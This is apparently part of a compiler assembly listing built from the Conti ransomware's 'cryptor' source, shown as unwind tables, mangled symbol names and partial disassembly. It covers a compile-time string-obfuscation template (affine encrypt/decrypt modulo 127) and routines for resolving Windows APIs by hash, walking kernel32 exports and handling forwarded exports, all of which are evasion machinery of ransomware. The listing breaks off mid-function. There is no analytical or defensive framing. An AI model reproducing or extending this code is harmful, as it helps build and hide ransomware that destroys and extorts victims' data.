;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0203H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0203H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0257H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0257H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0257H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0257H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0257H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0277H
	DW	02a1H
	DW	02cbH
	DW	02f5H
	DW	031fH
	DW	0349H
	DW	0373H
	DW	039dH
	DW	03c7H
	DW	03f1H
	DW	041bH
	DW	0445H
	DW	046fH
	DW	0479H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	052H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GetKernel32@@YAPEAUHINSTANCE__@@XZ DD 025050f01H
	DD	010a230fH
	DD	07003004dH
	DD	05002H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	036H
	DW	0119H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GetHashBase@@YAKPEAULDR_MODULE@@@Z DD 025053d19H
	DD	010e2313H
	DD	070070031H
	DD	05006H
	DD	imagerel __GSHandlerCheck
	DD	0178H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?GetHashBase@@YAKPEAULDR_MODULE@@@Z$rtcName$0 DB 06eH	; GetHashBase
	DB	061H
	DB	06dH
	DB	065H
	DB	00H
	ORG $+11
?GetHashBase@@YAKPEAULDR_MODULE@@@Z$rtcVarDesc DD 030H	; GetHashBase
	DD	040H
	DQ	FLAT:?GetHashBase@@YAKPEAULDR_MODULE@@@Z$rtcName$0
	ORG $+48
?GetHashBase@@YAKPEAULDR_MODULE@@@Z$rtcFrameData DD 01H	; GetHashBase
	DD	00H
	DQ	FLAT:?GetHashBase@@YAKPEAULDR_MODULE@@@Z$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GetApiAddr@@YA_KPEAUHINSTANCE__@@KPEA_K@Z DD 025053501H
	DD	0117231cH
	DD	070100049H
	DD	0500fH
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?GetApiAddr@@YA_KPEAUHINSTANCE__@@KPEA_K@Z$rtcName$0 DB 04fH ; GetApiAddr
	DB	072H
	DB	064H
	DB	069H
	DB	06eH
	DB	061H
	DB	06cH
	DB	00H
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?FindFunction@@YAHPEAUHINSTANCE__@@KPEAU_IMAGE_EXPORT_DIRECTORY@@@Z DD 025051c01H
	DD	0117231cH
	DD	070100035H
	DD	0500fH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	03aH
	DB	0b8H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?ReturnAddress@@YAXPEAKK@Z DD 025054119H
	DD	01122317H
	DD	0700b0021H
	DD	0500aH
	DD	imagerel __GSHandlerCheck
	DD	0f8H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?ReturnAddress@@YAXPEAKK@Z$rtcName$0 DB 074H		; ReturnAddress
	DB	065H
	DB	06dH
	DB	070H
	DB	00H
	ORG $+11
?ReturnAddress@@YAXPEAKK@Z$rtcVarDesc DD 024H		; ReturnAddress
	DD	04H
	DQ	FLAT:?ReturnAddress@@YAXPEAKK@Z$rtcName$0
	ORG $+48
?ReturnAddress@@YAXPEAKK@Z$rtcFrameData DD 01H		; ReturnAddress
	DD	00H
	DQ	FLAT:?ReturnAddress@@YAXPEAKK@Z$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GetFunctionAddresss@@YA_KPEAUHINSTANCE__@@PEAU_IMAGE_EXPORT_DIRECTORY@@J@Z DD 025051d01H
	DD	0118231dH
	DD	070110029H
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?CheckForForvardedProc@@YAH_KPEAU_IMAGE_EXPORT_DIRECTORY@@K@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	036H
	DW	0234H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GetForvardedProc@@YAPEAXPEAD@Z DD 025053d19H
	DD	010e2313H
	DD	070070051H
	DD	05006H
	DD	imagerel __GSHandlerCheck
	DD	0278H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?GetForvardedProc@@YAPEAXPEAD@Z$rtcName$0 DB 073H	; GetForvardedProc
	DB	07aH
	DB	044H
	DB	06cH
	DB	06cH
	DB	00H
	ORG $+2
?GetForvardedProc@@YAPEAXPEAD@Z$rtcName$1 DB 044H	; GetForvardedProc
	DB	04cH
	DB	04cH
	DB	04eH
	DB	061H
	DB	06dH
	DB	065H
	DB	00H
?GetForvardedProc@@YAPEAXPEAD@Z$rtcVarDesc DD 050H	; GetForvardedProc
	DD	0100H
	DQ	FLAT:?GetForvardedProc@@YAPEAXPEAD@Z$rtcName$1
	DD	024H
	DD	05H
	DQ	FLAT:?GetForvardedProc@@YAPEAXPEAD@Z$rtcName$0
	ORG $+96
?GetForvardedProc@@YAPEAXPEAD@Z$rtcFrameData DD 02H	; GetForvardedProc
	DD	00H
	DQ	FLAT:?GetForvardedProc@@YAPEAXPEAD@Z$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?my_stoi@@YAHPEAD@Z DD 025051301H
	DD	010e2313H
	DD	070070035H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?FindChar@@YAPEADPEADD@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?m_memcpy@@YAXPEAXQEAX_K@Z DD 025051d01H
	DD	0118231dH
	DD	070110031H
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?StrLen@@YAHPEB_W@Z DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?StrLen@@YAHPEBD@Z DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?morphcode@@YAXPEAX@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	01eH
	DW	025H
	DW	03fH
	DW	046H
	DW	049H
	DW	05bH
	DW	060H
	DW	06aH
	DW	082H
	DW	089H
	DW	08cH
	DW	09dH
	DW	0a2H
	DW	0acH
	DW	0beH
	DW	0d0H
	DW	0d3H
	DW	0e2H
	DW	0f3H
	DW	0f8H
	DW	0fdH
	DW	0102H
	DW	0109H
	DW	011aH
	DW	012cH
	DW	012fH
	DW	0140H
	DW	0151H
	DW	0156H
	DW	015bH
	DW	0160H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?morphcode@@YAXH@Z DD 025051201H
	DD	010d2312H
	DD	070060021H
	DD	05005H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?positive_modulo@@YAHHH@Z DD 025051601H
	DD	01112316H
	DD	0700a001dH
	DD	05009H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z DD 025052101H
	DD	011c2321H
	DD	070150021H
	DD	05014H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	03fH
	DW	03c8H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GetProcAddressEx@getapi@@YAPEAXPEBDKK@Z DD 025054619H
	DD	0117231cH
	DD	0701000b5H
	DD	0500fH
	DD	imagerel __GSHandlerCheck
	DD	0598H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?GetProcAddressEx@getapi@@YAPEAXPEBDKK@Z$rtcName$0 DB 050H ; getapi::GetProcAddressEx
	DB	072H
	DB	06fH
	DB	063H
	DB	041H
	DB	064H
	DB	064H
	DB	072H
	DB	065H
	DB	073H
	DB	073H
	DB	00H
	ORG $+4
?GetProcAddressEx@getapi@@YAPEAXPEBDKK@Z$rtcVarDesc DD 048H ; getapi::GetProcAddressEx
	DD	08H
	DQ	FLAT:?GetProcAddressEx@getapi@@YAPEAXPEBDKK@Z$rtcName$0
	ORG $+48
?GetProcAddressEx@getapi@@YAPEAXPEBDKK@Z$rtcFrameData DD 01H ; getapi::GetProcAddressEx
	DD	00H
	DQ	FLAT:?GetProcAddressEx@getapi@@YAPEAXPEBDKK@Z$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?SetRestartManagerLoaded@getapi@@YAXH@Z DD 025051201H
	DD	010d2312H
	DD	07006001dH
	DD	05005H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?IsRestartManagerLoaded@getapi@@YAHXZ DD 025050f01H
	DD	010a230fH
	DD	07003001dH
	DD	05002H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	02aH
	DB	0e2H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?InitializeGetapiModule@getapi@@YAHXZ DD 025053119H
	DD	010a230fH
	DD	070030021H
	DD	05002H
	DD	imagerel __GSHandlerCheck
	DD	0f8H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?InitializeGetapiModule@getapi@@YAHXZ$rtcName$0 DB 064H	; getapi::InitializeGetapiModule
	DB	077H
	DB	04cH
	DB	06fH
	DB	061H
	DB	064H
	DB	04cH
	DB	069H
	DB	062H
	DB	072H
	DB	061H
	DB	072H
	DB	079H
	DB	041H
	DB	00H
	ORG $+1
?InitializeGetapiModule@getapi@@YAHXZ$rtcVarDesc DD 028H ; getapi::InitializeGetapiModule
	DD	08H
	DQ	FLAT:?InitializeGetapiModule@getapi@@YAHXZ$rtcName$0
	ORG $+48
?InitializeGetapiModule@getapi@@YAHXZ$rtcFrameData DD 01H ; getapi::InitializeGetapiModule
	DD	00H
	DQ	FLAT:?InitializeGetapiModule@getapi@@YAHXZ$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$RtlSecureZeroMemory DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
; Function compile flags: /Odt
;	COMDAT __JustMyCode_Default
_TEXT	SEGMENT
__JustMyCode_Default PROC				; COMDAT
  00000	c2 00 00	 ret	 0
__JustMyCode_Default ENDP
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 19	 sub	 eax, 25
  0002d	6b c0 1f	 imul	 eax, eax, 31
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 29	 imul	 eax, eax, 41		; 00000029H
  0002d	83 c0 19	 add	 eax, 25
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
